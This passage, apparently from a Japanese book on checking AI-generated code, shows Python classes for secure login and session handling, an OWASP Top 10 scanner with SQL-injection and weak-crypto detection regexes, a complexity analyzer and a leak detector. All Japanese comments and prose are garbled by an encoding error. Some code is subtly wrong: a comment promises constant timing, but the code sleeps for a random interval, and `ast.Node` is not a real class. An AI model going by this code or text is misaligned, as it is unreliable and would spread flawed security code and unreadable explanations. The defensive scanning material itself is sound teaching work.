        self.rate_limiter = RateLimiter()
    
    def authenticate_user(
        self,
        username: str,
        password: str,
        request_context: RequestContext
    ) -> AuthenticationResult:
        """ã‚»ã‚­ãƒ¥ã‚¢ãªèªè¨¼å‡¦ç†"""
        
        # ãƒ¬ãƒ¼ãƒˆåˆ¶é™ãƒã‚§ãƒƒã‚¯
        if not self.rate_limiter.check_limit(
            key=f"auth:{request_context.ip_address}",
            limit=5,
            window=300  # 5åˆ†é–“ã«5å›ã¾ã§
        ):
            # ã‚¿ã‚¤ãƒŸãƒ³ã‚°æ”»æ’ƒå¯¾ç­–ï¼šå¸¸ã«åŒã˜æ™‚é–“ã‚’ã‹ã‘ã‚‹
            time.sleep(random.uniform(0.5, 1.5))
            raise AuthenticationError("Too many attempts")
        
        # ãƒ¦ãƒ¼ã‚¶ãƒ¼æ¤œç´¢ï¼ˆã‚¿ã‚¤ãƒŸãƒ³ã‚°æ”»æ’ƒå¯¾ç­–ï¼‰
        user = self._find_user_constant_time(username)
        
        if user is None:
            # å­˜åœ¨ã—ãªã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã§ã‚‚åŒã˜å‡¦ç†æ™‚é–“
            self._dummy_password_verification()
            raise AuthenticationError("Invalid credentials")
        
        # ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ãƒã‚§ãƒƒã‚¯
        if user.is_locked:
            raise AuthenticationError("Account is locked")
        
        if user.requires_password_change:
            # ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰å¤‰æ›´ãŒå¿…è¦
            return AuthenticationResult(
                success=False,
                requires_password_change=True,
                change_token=self._generate_password_change_token(user)
            )
        
        # ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰æ¤œè¨¼ï¼ˆconstant timeï¼‰
        is_valid = self.password_hasher.verify(
            password,
            user.password_hash
        )
        
        if not is_valid:
            # å¤±æ•—å›æ•°ã®è¨˜éŒ²
            self._record_failed_attempt(user, request_context)
            raise AuthenticationError("Invalid credentials")
        
        # 2è¦ç´ èªè¨¼ã®ãƒã‚§ãƒƒã‚¯
        if user.has_2fa_enabled:
            return AuthenticationResult(
                success=False,
                requires_2fa=True,
                temp_token=self._generate_2fa_token(user)
            )
        
        # æˆåŠŸï¼šã‚»ãƒƒã‚·ãƒ§ãƒ³ä½œæˆ
        session = self._create_secure_session(user, request_context)
        
        # ç›£æŸ»ãƒ­ã‚°
        self._audit_log_authentication(user, request_context, success=True)
        
        return AuthenticationResult(
            success=True,
            session_token=session.token,
            refresh_token=session.refresh_token
        )
    
    def authorize_action(
        self,
        user: User,
        resource: Resource,
        action: str,
        context: AuthorizationContext
    ) -> AuthorizationResult:
        """ã‚»ã‚­ãƒ¥ã‚¢ãªèªå¯å‡¦ç†"""
        
        # åŸºæœ¬çš„ãªæ¨©é™ãƒã‚§ãƒƒã‚¯
        if not user.is_active:
            return AuthorizationResult(
                allowed=False,
                reason="User account is not active"
            )
        
        # ãƒªã‚½ãƒ¼ã‚¹ãƒ™ãƒ¼ã‚¹ã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ï¼ˆRBACï¼‰
        user_roles = self._get_user_roles(user)
        required_permissions = self._get_required_permissions(
            resource,
            action
        )
        
        # æ¨©é™ã®è©•ä¾¡
        has_permission = False
        for role in user_roles:
            role_permissions = self._get_role_permissions(role)
            if required_permissions.issubset(role_permissions):
                has_permission = True
                break
        
        # å±æ€§ãƒ™ãƒ¼ã‚¹ã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ï¼ˆABACï¼‰ã®è¿½åŠ ãƒã‚§ãƒƒã‚¯
        if has_permission:
            # ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã«åŸºã¥ãè¿½åŠ åˆ¶ç´„
            abac_result = self._evaluate_abac_rules(
                user,
                resource,
                action,
                context
            )
            
            if not abac_result.allowed:
                return AuthorizationResult(
                    allowed=False,
                    reason=abac_result.reason
                )
        
        # å‹•çš„ãªæ¨©é™ãƒã‚§ãƒƒã‚¯ï¼ˆä¾‹ï¼šæ™‚é–“å¸¯åˆ¶é™ï¼‰
        if has_permission:
            temporal_check = self._check_temporal_constraints(
                user,
                action,
                context.timestamp
            )
            
            if not temporal_check.allowed:
                return AuthorizationResult(
                    allowed=False,
                    reason="Action not allowed at this time"
                )
        
        # ç›£æŸ»ãƒ­ã‚°
        self._audit_log_authorization(
            user,
            resource,
            action,
            allowed=has_permission
        )
        
        return AuthorizationResult(
            allowed=has_permission,
            reason="Permission granted" if has_permission else "Insufficient permissions"
        )
    
    def _create_secure_session(
        self,
        user: User,
        context: RequestContext
    ) -> Session:
        """ã‚»ã‚­ãƒ¥ã‚¢ãªã‚»ãƒƒã‚·ãƒ§ãƒ³ä½œæˆ"""
        
        # ã‚»ãƒƒã‚·ãƒ§ãƒ³IDã®ç”Ÿæˆï¼ˆæš—å·å­¦çš„ã«å®‰å…¨ï¼‰
        session_id = secrets.token_urlsafe(32)
        
        # JWTãƒˆãƒ¼ã‚¯ãƒ³ã®ç”Ÿæˆ
        access_token = self.token_manager.create_access_token(
            user_id=user.id,
            roles=user.roles,
            expires_in=3600,  # 1æ™‚é–“
            additional_claims={
                'ip': context.ip_address,
                'user_agent_hash': hashlib.sha256(
                    context.user_agent.encode()
                ).hexdigest()
            }
        )
        
        # ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³
        refresh_token = self.token_manager.create_refresh_token(
            user_id=user.id,
            expires_in=604800  # 7æ—¥
        )
        
        # ã‚»ãƒƒã‚·ãƒ§ãƒ³æƒ…å ±ã®ä¿å­˜
        session = Session(
            id=session_id,
            user_id=user.id,
            access_token=access_token,
            refresh_token=refresh_token,
            created_at=datetime.utcnow(),
            expires_at=datetime.utcnow() + timedelta(hours=1),
            ip_address=context.ip_address,
            user_agent=context.user_agent
        )
        
        # ã‚»ãƒƒã‚·ãƒ§ãƒ³å›ºå®šæ”»æ’ƒå¯¾ç­–
        self._invalidate_old_sessions(user.id)
        
        # ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚¹ãƒˆã‚¢ã«ä¿å­˜
        self._save_session(session)
        
        return session
```

### 5.2.3 OWASP Top 10ã¸ã®å¯¾å¿œ

**OWASP Top 10ã®é‡è¦æ€§**

OWASP Top 10ã¯ã€æœ€ã‚‚é‡è¦ãªWebã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒªã‚¹ã‚¯ã®ãƒªã‚¹ãƒˆã§ã‚ã‚‹ã€‚AIã¯ä¸€èˆ¬çš„ãªã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ãƒ‘ã‚¿ãƒ¼ãƒ³ã‚’å­¦ç¿’ã—ã¦ã„ã‚‹ãŒã€ã“ã‚Œã‚‰ã®ç‰¹å®šã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒªã‚¹ã‚¯ã¸ã®å¯¾å¿œã¯ä¸å®Œå…¨ãªã“ã¨ãŒå¤šã„ã€‚

**OWASP Top 10ãƒã‚§ãƒƒã‚«ãƒ¼ã®å®Ÿè£…**

```python
class OWASPTop10Checker:
    """OWASP Top 10ã®è„†å¼±æ€§ã‚’æ¤œå‡º"""
    
    def __init__(self):
        self.checkers = self._initialize_checkers()
    
    def check_codebase(
        self,
        codebase: Codebase
    ) -> OWASPAnalysisReport:
        """OWASP Top 10ã«åŸºã¥ãåŒ…æ‹¬çš„ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£åˆ†æ"""
        
        report = OWASPAnalysisReport()
        
        # å„ã‚«ãƒ†ã‚´ãƒªã®ãƒã‚§ãƒƒã‚¯ã‚’å®Ÿè¡Œ
        for category, checker in self.checkers.items():
            findings = checker.check(codebase)
            report.add_findings(category, findings)
        
        # ç·åˆçš„ãªãƒªã‚¹ã‚¯è©•ä¾¡
        report.risk_score = self._calculate_risk_score(report)
        report.recommendations = self._generate_recommendations(report)
        
        return report
    
    def _initialize_checkers(self) -> Dict[str, SecurityChecker]:
        """OWASP Top 10ã®å„ã‚«ãƒ†ã‚´ãƒªã«å¯¾å¿œã™ã‚‹ãƒã‚§ãƒƒã‚«ãƒ¼"""
        
        return {
            "A01_broken_access_control": BrokenAccessControlChecker(),
            "A02_cryptographic_failures": CryptographicFailuresChecker(),
            "A03_injection": InjectionChecker(),
            "A04_insecure_design": InsecureDesignChecker(),
            "A05_security_misconfiguration": SecurityMisconfigurationChecker(),
            "A06_vulnerable_components": VulnerableComponentsChecker(),
            "A07_auth_failures": AuthenticationFailuresChecker(),
            "A08_data_integrity_failures": DataIntegrityFailuresChecker(),
            "A09_logging_failures": LoggingFailuresChecker(),
            "A10_ssrf": SSRFChecker()
        }

class InjectionChecker(SecurityChecker):
    """A03: ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³è„†å¼±æ€§ã®ãƒã‚§ãƒƒã‚¯"""
    
    def check(self, codebase: Codebase) -> List[SecurityFinding]:
        findings = []
        
        # SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³
        sql_injections = self._check_sql_injection(codebase)
        findings.extend(sql_injections)
        
        # NoSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³
        nosql_injections = self._check_nosql_injection(codebase)
        findings.extend(nosql_injections)
        
        # ã‚³ãƒãƒ³ãƒ‰ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³
        command_injections = self._check_command_injection(codebase)
        findings.extend(command_injections)
        
        # LDAPã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³
        ldap_injections = self._check_ldap_injection(codebase)
        findings.extend(ldap_injections)
        
        # XPath/XMLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³
        xml_injections = self._check_xml_injection(codebase)
        findings.extend(xml_injections)
        
        return findings
    
    def _check_sql_injection(self, codebase: Codebase) -> List[SecurityFinding]:
        """SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®æ¤œå‡º"""
        
        findings = []
        
        # å±é™ºãªãƒ‘ã‚¿ãƒ¼ãƒ³ã‚’æ¤œç´¢
        dangerous_patterns = [
            # æ–‡å­—åˆ—é€£çµã«ã‚ˆã‚‹ã‚¯ã‚¨ãƒªæ§‹ç¯‰
            (r'query\s*=\s*["\'].*["\'].*\+.*', "String concatenation in SQL query"),
            # ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆæ–‡å­—åˆ—
            (r'\.format\(.*\).*(?:SELECT|INSERT|UPDATE|DELETE)', "Format string in SQL"),
            # f-string
            (r'f["\'].*(?:SELECT|INSERT|UPDATE|DELETE).*{.*}', "F-string in SQL"),
            # %æ¼”ç®—å­
            (r'%\s*\(.*\).*(?:SELECT|INSERT|UPDATE|DELETE)', "% formatting in SQL")
        ]
        
        for file_path, content in codebase.files.items():
            for pattern, description in dangerous_patterns:
                matches = re.finditer(pattern, content, re.IGNORECASE)
                for match in matches:
                    # èª¤æ¤œå‡ºã‚’æ¸›ã‚‰ã™ãŸã‚ã®è¿½åŠ ãƒã‚§ãƒƒã‚¯
                    if self._is_likely_vulnerable(match, content):
                        finding = SecurityFinding(
                            type="SQL_INJECTION",
                            severity="CRITICAL",
                            file=file_path,
                            line=self._get_line_number(content, match.start()),
                            code_snippet=match.group(0),
                            description=description,
                            recommendation=self._get_sql_injection_fix(match)
                        )
                        findings.append(finding)
        
        return findings
    
    def _get_sql_injection_fix(self, match: re.Match) -> str:
        """SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³å¯¾ç­–ã®æ¨å¥¨äº‹é …"""
        
        return """
        ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿åŒ–ã‚¯ã‚¨ãƒªã‚’ä½¿ç”¨ã—ã¦ãã ã•ã„ï¼š
        
        # å±é™ºãªä¾‹
        query = f"SELECT * FROM users WHERE id = {user_id}"
        
        # å®‰å…¨ãªä¾‹
        query = "SELECT * FROM users WHERE id = %s"
        cursor.execute(query, (user_id,))
        
        # ORMã‚’ä½¿ç”¨ã™ã‚‹å ´åˆ
        User.objects.filter(id=user_id)
        """

class CryptographicFailuresChecker(SecurityChecker):
    """A02: æš—å·åŒ–ã®å¤±æ•—ã‚’ãƒã‚§ãƒƒã‚¯"""
    
    def check(self, codebase: Codebase) -> List[SecurityFinding]:
        findings = []
        
        # å¼±ã„æš—å·ã‚¢ãƒ«ã‚´ãƒªã‚ºãƒ 
        weak_crypto = self._check_weak_crypto(codebase)
        findings.extend(weak_crypto)
        
        # ãƒãƒ¼ãƒ‰ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸæš—å·éµ
        hardcoded_keys = self._check_hardcoded_keys(codebase)
        findings.extend(hardcoded_keys)
        
        # ä¸é©åˆ‡ãªä¹±æ•°ç”Ÿæˆ
        weak_random = self._check_weak_random(codebase)
        findings.extend(weak_random)
        
        # æš—å·åŒ–ã•ã‚Œã¦ã„ãªã„æ©Ÿå¯†ãƒ‡ãƒ¼ã‚¿
        unencrypted_data = self._check_unencrypted_sensitive_data(codebase)
        findings.extend(unencrypted_data)
        
        return findings
    
    def _check_weak_crypto(self, codebase: Codebase) -> List[SecurityFinding]:
        """å¼±ã„æš—å·ã‚¢ãƒ«ã‚´ãƒªã‚ºãƒ ã®æ¤œå‡º"""
        
        findings = []
        weak_algorithms = {
            'md5': 'MD5 is cryptographically broken',
            'sha1': 'SHA1 is deprecated for security use',
            'des': 'DES key size is too small',
            'rc4': 'RC4 has known vulnerabilities'
        }
        
        for file_path, content in codebase.files.items():
            for algo, reason in weak_algorithms.items():
                # ã‚¤ãƒ³ãƒãƒ¼ãƒˆæ–‡ã®ãƒã‚§ãƒƒã‚¯
                import_pattern = f'import.*{algo}|from.*{algo}'
                
                # ä½¿ç”¨ç®‡æ‰€ã®ãƒã‚§ãƒƒã‚¯
                usage_pattern = f'{algo}\\(|{algo.upper()}\\('
                
                for pattern in [import_pattern, usage_pattern]:
                    matches = re.finditer(pattern, content, re.IGNORECASE)
                    for match in matches:
                        finding = SecurityFinding(
                            type="WEAK_CRYPTOGRAPHY",
                            severity="HIGH",
                            file=file_path,
                            line=self._get_line_number(content, match.start()),
                            code_snippet=match.group(0),
                            description=f"Weak cryptographic algorithm: {reason}",
                            recommendation=self._get_crypto_recommendation(algo)
                        )
                        findings.append(finding)
        
        return findings
```

## 5.3 ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹å•é¡Œã®ç™ºè¦‹

### 5.3.1 è¨ˆç®—é‡ã®é™çš„è§£æ

**ãªãœè¨ˆç®—é‡ã®åˆ†æãŒé‡è¦ãªã®ã‹**

AIã¯å‹•ä½œã™ã‚‹ã‚³ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã™ã‚‹ã“ã¨ã«ç„¦ç‚¹ã‚’å½“ã¦ã‚‹ãŸã‚ã€åŠ¹ç‡æ€§ã¯äºŒã®æ¬¡ã«ãªã‚ŠãŒã¡ã§ã‚ã‚‹ã€‚ç‰¹ã«ã€ãƒã‚¹ãƒˆã—ãŸãƒ«ãƒ¼ãƒ—ã‚„å†å¸°çš„ãªã‚¢ãƒ«ã‚´ãƒªã‚ºãƒ ã«ãŠã„ã¦ã€æŒ‡æ•°é–¢æ•°çš„ãªè¨ˆç®—é‡ã‚’æŒã¤ã‚³ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã™ã‚‹ã“ã¨ãŒã‚ã‚‹ã€‚ã“ã‚Œã¯ã€å°ã•ãªãƒ‡ãƒ¼ã‚¿ã‚»ãƒƒãƒˆã§ã¯å•é¡Œã«ãªã‚‰ãªã„ãŒã€æœ¬ç•ªç’°å¢ƒã§ã¯è‡´å‘½çš„ãªãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹å•é¡Œã‚’å¼•ãèµ·ã“ã™ã€‚

**è¨ˆç®—é‡è§£æã‚¨ãƒ³ã‚¸ãƒ³ã®å®Ÿè£…**

```python
class ComplexityAnalyzer:
    """è¨ˆç®—é‡ã®é™çš„è§£æã‚¨ãƒ³ã‚¸ãƒ³"""
    
    def __init__(self):
        self.loop_analyzer = LoopComplexityAnalyzer()
        self.recursion_analyzer = RecursionAnalyzer()
        self.data_structure_analyzer = DataStructureAnalyzer()
    
    def analyze_complexity(
        self,
        function_ast: ast.FunctionDef,
        context: AnalysisContext
    ) -> ComplexityReport:
        """é–¢æ•°ã®æ™‚é–“è¨ˆç®—é‡ã¨ç©ºé–“è¨ˆç®—é‡ã‚’è§£æ"""
        
        report = ComplexityReport(function_name=function_ast.name)
        
        # æ™‚é–“è¨ˆç®—é‡ã®è§£æ
        time_complexity = self._analyze_time_complexity(function_ast, context)
        report.time_complexity = time_complexity
        
        # ç©ºé–“è¨ˆç®—é‡ã®è§£æ
        space_complexity = self._analyze_space_complexity(function_ast, context)
        report.space_complexity = space_complexity
        
        # ãƒœãƒˆãƒ«ãƒãƒƒã‚¯ã®ç‰¹å®š
        bottlenecks = self._identify_bottlenecks(function_ast)
        report.bottlenecks = bottlenecks
        
        # æ”¹å–„ææ¡ˆ
        report.improvements = self._suggest_improvements(
            time_complexity,
            space_complexity,
            bottlenecks
        )
        
        return report
    
    def _analyze_time_complexity(
        self,
        function_ast: ast.FunctionDef,
        context: AnalysisContext
    ) -> TimeComplexity:
        """æ™‚é–“è¨ˆç®—é‡ã®è§£æ"""
        
        # åŸºæœ¬ãƒ–ãƒ­ãƒƒã‚¯ã”ã¨ã®è¨ˆç®—é‡
        block_complexities = []
        
        for node in ast.walk(function_ast):
            if isinstance(node, ast.For):
                # ãƒ«ãƒ¼ãƒ—ã®è¨ˆç®—é‡
                loop_complexity = self.loop_analyzer.analyze_loop(node, context)
                block_complexities.append(loop_complexity)
                
            elif isinstance(node, ast.While):
                # Whileãƒ«ãƒ¼ãƒ—ã®è¨ˆç®—é‡ï¼ˆã‚ˆã‚Šè¤‡é›‘ï¼‰
                while_complexity = self.loop_analyzer.analyze_while_loop(node, context)
                block_complexities.append(while_complexity)
                
            elif isinstance(node, ast.Call):
                # é–¢æ•°å‘¼ã³å‡ºã—ã®è¨ˆç®—é‡
                if self._is_recursive_call(node, function_ast.name):
                    recursion_complexity = self.recursion_analyzer.analyze_recursion(
                        function_ast,
                        node,
                        context
                    )
                    block_complexities.append(recursion_complexity)
                else:
                    # æ¨™æº–ãƒ©ã‚¤ãƒ–ãƒ©ãƒªé–¢æ•°ã®æ—¢çŸ¥ã®è¨ˆç®—é‡
                    call_complexity = self._get_known_complexity(node)
                    if call_complexity:
                        block_complexities.append(call_complexity)
        
        # å…¨ä½“ã®è¨ˆç®—é‡ã‚’åˆæˆ
        total_complexity = self._combine_complexities(block_complexities)
        
        return total_complexity
    
    def _identify_bottlenecks(
        self,
        function_ast: ast.FunctionDef
    ) -> List[Bottleneck]:
        """ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ãƒœãƒˆãƒ«ãƒãƒƒã‚¯ã®ç‰¹å®š"""
        
        bottlenecks = []
        
        # ãƒã‚¹ãƒˆã—ãŸãƒ«ãƒ¼ãƒ—ã®æ¤œå‡º
        nested_loops = self._find_nested_loops(function_ast)
        for loop_nest in nested_loops:
            if loop_nest.depth >= 3:
                bottlenecks.append(Bottleneck(
                    type="DEEPLY_NESTED_LOOPS",
                    location=loop_nest.location,
                    severity="HIGH",
                    description=f"{loop_nest.depth}é‡ã®ãƒã‚¹ãƒˆã—ãŸãƒ«ãƒ¼ãƒ—",
                    estimated_complexity=f"O(n^{loop_nest.depth})",
                    suggestion="ãƒ«ãƒ¼ãƒ—ã®çµ±åˆã¾ãŸã¯äº‹å‰è¨ˆç®—ã®æ¤œè¨"
                ))
        
        # éåŠ¹ç‡ãªãƒ‡ãƒ¼ã‚¿æ§‹é€ ã®ä½¿ç”¨
        inefficient_patterns = self._find_inefficient_patterns(function_ast)
        for pattern in inefficient_patterns:
            if pattern.type == "LIST_IN_LOOKUP":
                bottlenecks.append(Bottleneck(
                    type="INEFFICIENT_DATA_STRUCTURE",
                    location=pattern.location,
                    severity="MEDIUM",
                    description="ãƒªã‚¹ãƒˆå†…ã§ã®é »ç¹ãªæ¤œç´¢",
                    suggestion="ã‚»ãƒƒãƒˆã¾ãŸã¯è¾æ›¸ã®ä½¿ç”¨ã‚’æ¤œè¨"
                ))
        
        # ç¹°ã‚Šè¿”ã—è¨ˆç®—
        repeated_computations = self._find_repeated_computations(function_ast)
        for computation in repeated_computations:
            bottlenecks.append(Bottleneck(
                type="REPEATED_COMPUTATION",
                location=computation.location,
                severity="MEDIUM",
                description="åŒã˜è¨ˆç®—ã®ç¹°ã‚Šè¿”ã—",
                suggestion="ãƒ¡ãƒ¢åŒ–ã¾ãŸã¯äº‹å‰è¨ˆç®—ã®ä½¿ç”¨"
            ))
        
        return bottlenecks
```

**å…·ä½“çš„ãªè¨ˆç®—é‡ãƒ‘ã‚¿ãƒ¼ãƒ³ã®æ¤œå‡º**

```python
class SpecificComplexityPatterns:
    """ç‰¹å®šã®è¨ˆç®—é‡ãƒ‘ã‚¿ãƒ¼ãƒ³ã®æ¤œå‡ºã¨æ”¹å–„"""
    
    def detect_n_plus_one_queries(
        self,
        code_ast: ast.AST
    ) -> List[NPlusOnePattern]:
        """N+1ã‚¯ã‚¨ãƒªå•é¡Œã®æ¤œå‡º"""
        
        patterns = []
        
        # ãƒ«ãƒ¼ãƒ—å†…ã§ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚¢ã‚¯ã‚»ã‚¹ã‚’æ¤œå‡º
        for node in ast.walk(code_ast):
            if isinstance(node, ast.For):
                # ãƒ«ãƒ¼ãƒ—æœ¬ä½“å†…ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å‘¼ã³å‡ºã—ã‚’æ¢ã™
                db_calls = self._find_db_calls_in_loop(node)
                
                for db_call in db_calls:
                    if self._is_dependent_on_loop_var(db_call, node.target):
                        pattern = NPlusOnePattern(
                            loop_location=node,
                            query_location=db_call,
                            description="ãƒ«ãƒ¼ãƒ—å†…ã§ã®å€‹åˆ¥ã‚¯ã‚¨ãƒªå®Ÿè¡Œ",
                            fix_suggestion=self._generate_batch_query_suggestion(
                                node,
                                db_call
                            )
                        )
                        patterns.append(pattern)
        
        return patterns
    
    def detect_quadratic_string_concatenation(
        self,
        code_ast: ast.AST
    ) -> List[QuadraticPattern]:
        """äºŒæ¬¡çš„ãªæ–‡å­—åˆ—é€£çµã®æ¤œå‡º"""
        
        patterns = []
        
        for node in ast.walk(code_ast):
            if isinstance(node, ast.For):
                # ãƒ«ãƒ¼ãƒ—å†…ã§ã®æ–‡å­—åˆ—é€£çµã‚’æ¤œå‡º
                string_ops = self._find_string_concatenations(node)
                
                for string_op in string_ops:
                    if self._is_accumulating_string(string_op):
                        pattern = QuadraticPattern(
                            location=string_op,
                            description="ãƒ«ãƒ¼ãƒ—å†…ã§ã®æ–‡å­—åˆ—é€£çµï¼ˆO(nÂ²)ï¼‰",
                            current_complexity="O(nÂ²)",
                            improved_complexity="O(n)",
                            fix_code=self._generate_string_builder_fix(node, string_op)
                        )
                        patterns.append(pattern)
        
        return patterns
    
    def _generate_string_builder_fix(
        self,
        loop_node: ast.For,
        string_op: ast.Node
    ) -> str:
        """æ–‡å­—åˆ—é€£çµã®æ”¹å–„ã‚³ãƒ¼ãƒ‰ç”Ÿæˆ"""
        
        return '''
        # éåŠ¹ç‡ãªæ–¹æ³•ï¼ˆO(nÂ²)ï¼‰
        result = ""
        for item in items:
            result += str(item)  # æ¯å›æ–°ã—ã„æ–‡å­—åˆ—ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œæˆ
        
        # åŠ¹ç‡çš„ãªæ–¹æ³•ï¼ˆO(n)ï¼‰
        parts = []
        for item in items:
            parts.append(str(item))
        result = "".join(parts)
        
        # ã‚ˆã‚Šç°¡æ½”ãªæ–¹æ³•
        result = "".join(str(item) for item in items)
        '''
    
    def detect_inefficient_algorithms(
        self,
        code_ast: ast.AST
    ) -> List[AlgorithmIssue]:
        """éåŠ¹ç‡ãªã‚¢ãƒ«ã‚´ãƒªã‚ºãƒ ã®æ¤œå‡º"""
        
        issues = []
        
        # ãƒãƒ–ãƒ«ã‚½ãƒ¼ãƒˆãªã©ã®éåŠ¹ç‡ãªã‚½ãƒ¼ãƒˆ
        inefficient_sorts = self._detect_inefficient_sorts(code_ast)
        issues.extend(inefficient_sorts)
        
        # ç·šå½¢æ¢ç´¢ vs ãƒã‚¤ãƒŠãƒªã‚µãƒ¼ãƒ
        linear_searches = self._detect_linear_searches(code_ast)
        issues.extend(linear_searches)
        
        # éåŠ¹ç‡ãªé‡è¤‡æ’é™¤
        inefficient_dedup = self._detect_inefficient_deduplication(code_ast)
        issues.extend(inefficient_dedup)
        
        return issues
```

### 5.3.2 ãƒ¡ãƒ¢ãƒªãƒªãƒ¼ã‚¯æ¤œå‡º

**AIã‚³ãƒ¼ãƒ‰ã«ãŠã‘ã‚‹ãƒ¡ãƒ¢ãƒªãƒªãƒ¼ã‚¯ã®ç‰¹å¾´**

AIã¯æ˜ç¤ºçš„ãªãƒ¡ãƒ¢ãƒªç®¡ç†ã‚’å¿…è¦ã¨ã—ãªã„é«˜ãƒ¬ãƒ™ãƒ«è¨€èªã§ã®ãƒ‘ã‚¿ãƒ¼ãƒ³ã‚’å­¦ç¿’ã—ã¦ã„ã‚‹ã“ã¨ãŒå¤šãã€ãƒªã‚½ãƒ¼ã‚¹ã®é©åˆ‡ãªè§£æ”¾ã‚’å¿˜ã‚ŒãŒã¡ã§ã‚ã‚‹ã€‚ç‰¹ã«ã€ãƒ•ã‚¡ã‚¤ãƒ«ãƒãƒ³ãƒ‰ãƒ«ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹æ¥ç¶šã€å¤§ããªãƒ‡ãƒ¼ã‚¿æ§‹é€ ã®ç®¡ç†ã«ãŠã„ã¦å•é¡ŒãŒç™ºç”Ÿã—ã‚„ã™ã„ã€‚

**ãƒ¡ãƒ¢ãƒªãƒªãƒ¼ã‚¯æ¤œå‡ºå™¨ã®å®Ÿè£…**

```python
class MemoryLeakDetector:
    """ãƒ¡ãƒ¢ãƒªãƒªãƒ¼ã‚¯ã¨ãƒªã‚½ãƒ¼ã‚¹ãƒªãƒ¼ã‚¯ã®æ¤œå‡º"""
    
    def __init__(self):
        self.resource_trackers = {
            'file': FileResourceTracker(),
            'database': DatabaseResourceTracker(),
            'network': NetworkResourceTracker(),
            'memory': MemoryAllocationTracker()
        }
    
    def detect_leaks(
        self,
        code_ast: ast.AST,
        runtime_profile: Optional[RuntimeProfile] = None
    ) -> LeakAnalysisReport:
        """ãƒ¡ãƒ¢ãƒªã¨ãƒªã‚½ãƒ¼ã‚¹ãƒªãƒ¼ã‚¯ã®åŒ…æ‹¬çš„æ¤œå‡º"""
        
        report = LeakAnalysisReport()
        
        # é™çš„è§£æã«ã‚ˆã‚‹ãƒªãƒ¼ã‚¯æ¤œå‡º
        static_leaks = self._static_leak_detection(code_ast)
        report.static_findings = static_leaks
        
        # å®Ÿè¡Œæ™‚ãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«ãŒã‚ã‚‹å ´åˆã®å‹•çš„è§£æ
        if runtime_profile:
            dynamic_leaks = self._dynamic_leak_detection(runtime_profile)
            report.dynamic_findings = dynamic_leaks
        
        # ãƒ‘ã‚¿ãƒ¼ãƒ³ãƒ™ãƒ¼ã‚¹ã®æ¤œå‡º
        pattern_leaks = self._pattern_based_detection(code_ast)
        report.pattern_findings = pattern_leaks
        
        # ç·åˆè©•ä¾¡
        report.risk_assessment = self._assess_leak_risk(report)
        
        return report
    
    def _static_leak_detection(
        self,
        code_ast: ast.AST
    ) -> List[StaticLeakFinding]:
        """é™çš„è§£æã«ã‚ˆã‚‹ãƒªãƒ¼ã‚¯æ¤œå‡º"""
        
        findings = []
        
        # ãƒªã‚½ãƒ¼ã‚¹ç¢ºä¿ã¨è§£æ”¾ã®è¿½è·¡
        resource_flow = self._analyze_resource_flow(code_ast)
        
        for resource in resource_flow.acquired_resources:
            if not resource.is_released:
                # è§£æ”¾ã•ã‚Œã¦ã„ãªã„ãƒªã‚½ãƒ¼ã‚¹
                finding = StaticLeakFinding(
                    type="UNRELEASED_RESOURCE",
                    resource_type=resource.type,
                    acquisition_point=resource.location,
                    description=f"{resource.type}ãŒè§£æ”¾ã•ã‚Œã¦ã„ã¾ã›ã‚“",
                    severity=self._calculate_severity(resource),
                    fix_suggestion=self._generate_cleanup_code(resource)
                )
                findings.append(finding)
            
            elif resource.release_point:
                # ä¾‹å¤–ãƒ‘ã‚¹ã§ã®è§£æ”¾æ¼ã‚Œãƒã‚§ãƒƒã‚¯
                if not self._is_exception_safe(resource):
                    finding = StaticLeakFinding(
                        type="EXCEPTION_UNSAFE_CLEANUP",
                        resource_type=resource.type,
                        description="ä¾‹å¤–ç™ºç”Ÿæ™‚ã«ãƒªã‚½ãƒ¼ã‚¹ãŒè§£æ”¾ã•ã‚Œãªã„å¯èƒ½æ€§",
                        fix_suggestion=self._generate_exception_safe_code(resource)
                    )
                    findings.append(finding)
        
        # å¾ªç’°å‚ç…§ã®æ¤œå‡º
        circular_refs = self._detect_circular_references(code_ast)
        for ref in circular_refs:
            finding = StaticLeakFinding(
